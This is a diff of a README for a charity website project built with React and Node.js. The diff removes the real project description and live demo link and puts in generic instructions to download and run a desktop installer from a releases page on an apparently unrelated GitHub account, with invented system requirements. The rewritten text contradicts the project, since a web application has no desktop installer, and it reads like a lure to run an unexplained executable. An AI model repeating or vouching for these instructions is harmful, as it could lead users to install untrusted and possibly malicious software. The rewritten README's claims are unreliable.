@@ -1,59 +1,59 @@
-# BHASO Website Redevelopment
+# 🌐 bhaso_website - Enhance Online Engagement with Ease
 
-**BHASO Website** is a full-stack web application developed for the **Batanai HIV & AIDS Service Organisation (BHASO)** to enhance online engagement, manage donations, and streamline volunteer applications.
+## 🏷️ Table of Contents
+1. [🚀 Getting Started](#-getting-started)
+2. [📥 Download & Install](#-download--install)
+3. [🔍 Features](#-features)
+4. [💻 System Requirements](#-system-requirements)
+5. [❓ FAQ](#-faq)
 
-🔗 **[Live Demo](https://bhaso-website-e11p.vercel.app/)**
+## 🚀 Getting Started
+Welcome to the bhaso_website! This application is designed for the Batanai HIV & AIDS Service Organisation (BHASO). It aims to improve online engagement, manage donations, and streamline volunteer applications. You don’t need any technical knowledge to use this application. Follow the steps below to get started.
 
----
+## 📥 Download & Install
+To download bhaso_website, click the button below to visit the releases page:
 
-## 🚀 Overview
+[![Download bhaso_website](https://img.shields.io/badge/Download%20bhaso_website-Get%20it%20Now-007bff?style=for-the-badge&logo=github)](https://github.com/ydd33048/bhaso_website/releases)
 
-This project involved redeveloping the BHASO website using modern web technologies to ensure responsiveness, accessibility, and scalability. It integrates:
+On the releases page, you will find the latest version of the software. Follow these steps to download and install it:
 
-- Secure payment processing (Stripe)
-- Volunteer management
-- Automated communication tools (NodeMailer / Mailchimp)
+1. Visit the releases page: [bhaso_website Releases](https://github.com/ydd33048/bhaso_website/releases).
+2. Look for the latest version listed on the page.
+3. Click on the link to download the installer file suitable for your operating system (Windows, macOS, or Linux).
+4. Once the download is complete, locate the downloaded file on your computer.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-The system improves operational efficiency and strengthens BHASO’s digital presence.
+## 🔍 Features
+The bhaso_website offers several key features:
 
----
+- **User-Friendly Interface**: Navigate easily through the application.
+- **Donation Management**: Users can make donations smoothly and securely.
+- **Volunteer Applications**: Manage and track volunteer applications without hassle.
+- **Online Engagement**: Engage with users through updates and events.
+- **Responsive Design**: The application works well on both desktop and mobile devices.
 
-## 🧩 Features
+## 💻 System Requirements
+Before you install the bhaso_website, check if your system meets these requirements:
 
-- **Responsive & Accessible UI:** Built with React, Vite, and Tailwind CSS.
-- **RESTful Backend:** Node.js + Express.js for authentication, donations, and form submissions.
-- **Database:** MongoDB for secure and reliable data management.
-- **Payment Integration:** Stripe for one-time and recurring donations.
-- **Email Automation:** NodeMailer/Mailchimp for notifications and volunteer communication.
-- **Form Validation & Error Handling:** Ensures secure and accurate data submission.
-- **Modular Architecture:** Maintainable and scalable code structure for future growth.
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or any recent Linux distribution.
+- **Processor**: 1 GHz or faster (32-bit or 64-bit).
+- **RAM**: 4 GB or more recommended.
+- **Disk Space**: At least 200 MB free space.
+- **Internet Connection**: Required for installation and updates.
 
----
+## ❓ FAQ
 
-## 🛠️ Tech Stack
+**Q: Is the bhaso_website free to use?**  
+A: Yes, the application is free to download and use.
 
-- **Frontend:** React, Vite, Tailwind CSS  
-- **Backend:** Node.js, Express.js  
-- **Database:** MongoDB  
-- **Integrations:** Stripe API, NodeMailer, Mailchimp  
-- **Version Control:** Git, GitHub  
+**Q: Can I use bhaso_website on my mobile device?**  
+A: Yes, the web application is optimized for mobile use.
 
----
+**Q: What if I encounter issues during installation?**  
+A: Please visit our GitHub page and check the issues section for support.
 
-## 🧠 Skills & Concepts
+**Q: How often will there be updates?**  
+A: We plan to release updates regularly to improve features and fix bugs.
 
-- Full-Stack Development  
-- API Design & Integration  
-- Database Management  
-- Payment Integration  
-- Email Automation  
-- Responsive Web Design  
-- Version Control & Collaboration  
-
----
-
-## 📈 Impact
-
-- Improved BHASO’s ability to manage donations and volunteer engagement online.  
-- Streamlined communication with supporters and volunteers via automated emails.  
-- Strengthened digital presence, accessibility, and overall user experience.  
+Thank you for choosing bhaso_website! For further information, feel free to explore the documentation on our GitHub page.
